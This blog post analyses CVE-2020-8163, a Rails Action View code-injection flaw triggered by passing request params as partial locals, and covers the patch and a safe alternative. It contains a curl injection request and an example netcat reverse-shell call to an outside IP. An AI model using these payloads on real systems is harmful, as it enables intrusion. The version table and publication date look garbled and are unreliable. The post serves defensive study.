---
layout: post
title:  "CVE-2020-8163"
summary: "Potential Remote Code Execution in Action View"
date: 2020-08-22 00:13:37
image: /assets/profile.png
author: tim_koopmans
categories: ruby
tags:
 - security
---
# Potential Remote Code Execution in Action View

If you **user parameters as local variables** into partials on affected versions of Rails, it is possible for attackers to perform remote code execution. From there, _really_ bad things happen.
{: .critical }

<script id="asciicast-VVnc3ItIsDe7PgbRxtASUByTH" src="https://asciinema.org/a/VVnc3ItIsDe7PgbRxtASUByTH.js" async></script>
<table>
  <thead>
    <tr>
      <th>Related Code</th>
      <th>Affected Versions</th>
      <th>Patched Versions</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <i class="devicon-ruby-plain"></i>
        <a href="https://api.rubyonrails.org/classes/ActionView.html">ActionView</a>
      </td>
      <td>
        All
      </td>
      <td>
        < 5.0.1
      </td>
    </tr>
  </tbody>
</table>

## Vulnerability[^fn-nist]

The `locals` argument to rendering a partial, does not sanitize user input. A vulnerable call to a partial template will look something like this:

```erb
<%= render partial: 'flag', locals: params %>
```

## Weakness

This vulnerability lets an attacker [inject code](http://cwe.mitre.org/data/definitions/94.html) which can lead to remote code execution.

## Attack

The attacking request will look something like this[^fn-demo]:

{% highlight bash %}
{% raw %}
curl http://target/users/index?system(%27whoami%27)%0A%23"
{% endraw %}
{% endhighlight %}

Since the query parameter contains arbitrary code and the targeted controller renders a partial view with local variables, this same code can potentially be executed on the target platform as a system call. Other variants to this attack might include the use of \``backticks`\` or `%x` / `Kernel#` methods.

## Analysis

The `ActionView::Template` class has a protected method called `compile` which sets the encoding of the compiled template for the view. Within this method, the dynamic views created by partials are eval'd into the encoded view[^fn-analysis]. It does this by [building a string](https://github.com/rails/rails/blob/v5.0.0/actionview/lib/action_view/template.rb#L287-L293) which is a dynamic method that uses `module_eval` to [evaluates the string in the context of mod](https://apidock.com/ruby/Module/module_eval). This is how the attacker is able to run abitrary code.

The dynamic string that is built will look something like this at run time:

```ruby
def _app_views_users__unsafe_html_erb___2814227942932613306_70032701656460(local_assigns, output_buffer)
  _old_virtual_path, @virtual_path = @virtual_path, "users/_unsafe"
  _old_output_buffer = @output_buffer
  action = action = local_assigns[:action]
  controller = controller = local_assigns[:controller]
  system('nc 192.168.1.104 4443 -e /bin/bash')
  #
  ...
ensure
  @virtual_path, @output_buffer = _old_virtual_path, _old_output_buffer
end
```

You can see in this example, the system method where the attacker then uses netcat to perform a reverse shell from within your server environment. This would of course depend on you having netcat installed, but given the attacker could chain these system calls, they could perform the necessary steps through remote code execution.

So how did this system call get into the dynamically eval'd method above in the first place?

The first thing the attacker would need, is for you to be rendering partials with the locals argument:

```erb
<%= render partial: 'flag', locals: params %>
```

When the `compile` method builds the aforementioned string, it makes another call to the `locals_code` [method in the same class](https://github.com/rails/rails/blob/v5.0.0/actionview/lib/action_view/template.rb#L327-L330) which looks like this:


```ruby
def locals_code #:nodoc:
  # Double assign to suppress the dreaded 'assigned but unused variable' warning
  @locals.each_with_object('') { |key, code| code << "#{key} = #{key} = local_assigns[:#{key}];" }
end
```

You can see here, that the `@locals` array iterates over each item and concatenates it to the string object. If the attacker passed in a parameter such as `system(%27whoami%27)%0A%23` then the resulting string will look something like:

```ruby
system(\'nwhoami\')
# = system(\'nwhoami\')
# = local_assigns[:system(\'nwhoami\')
```

By properly encoding the parameter, and appending a new line `%0A` followed by a hash `%23` the attacker is able to create a syntactically correct, dynamic method which is when evaluated, executes their system call.

A more simple demonstration with Ruby looks like this:

```ruby
source = 'def dynamic_method
  system(\'whoami\')
  #
end'

class Thing
end

Thing.module_eval(source)

irb(main):052:0> Thing.new.dynamic_method
root
```

## Fix

The best fix for this, is to upgrade Rails to a patched version.

The patch itself, sanitizes items in the `@locals` array of the `locals_code` method with something like this:

```ruby
+        locals = @locals.to_set - Module::DELEGATION_RESERVED_METHOD_NAMES
+        locals = locals.grep(/\A(?![A-Z0-9])(?:[[:alnum:]_]|[^\0-\177])+\z/)
```

The vulnerability can also be mitigated by making sure you do not render partials with user provided paramaters with something like this instead:

```erb
<%= render partial: 'flag', locals: { user: @user } %>
```

# Research

You can re-create this in a [CVE laboratory environment](https://github.com/correkthorse/rails-cve-testing) using Docker.

    CVE=CVE-2020-8163 RAILS_VERSION=4.2.11.1 make lab

# References

[^fn-nist]: [First published at NVD on 7 February 2020](https://nvd.nist.gov/vuln/detail/CVE-2020-8163)
[^fn-demo]: [CVE-2020-8163 - Remote code execution of user-provided local names in Rails](https://github.com/sh286/CVE-2020-8163)
[^fn-analysis]: [CVE-2020-8163: Partial Remote Code Execution](https://medium.com/@qazbnm456/cve-2020-8163-partial-remote-code-execution-c6f46bcdef2)
